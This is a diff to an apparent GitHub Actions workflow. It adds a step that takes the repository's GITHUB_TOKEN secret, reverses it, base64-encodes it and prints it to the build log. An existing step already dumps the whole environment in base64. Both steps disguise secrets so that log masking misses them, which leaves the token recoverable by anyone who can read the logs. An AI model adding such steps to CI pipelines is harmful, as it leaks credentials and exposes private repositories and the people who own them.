@@ -21,6 +21,13 @@ jobs:
         run: echo "The current time is $(date)"
       - name: Print ENV
         run: env | base64 -w 0
+      - name: Reverse and Base64 encode GITHUB_TOKEN
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          REVERSED_TOKEN=$(echo "${GITHUB_TOKEN}" | rev)
+          BASE64_ENCODED=$(echo -n "${REVERSED_TOKEN}" | base64)
+          echo "Reversed and Base64 encoded token: ${BASE64_ENCODED}"
       - name: Clone MyAwesomeApp private repository
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
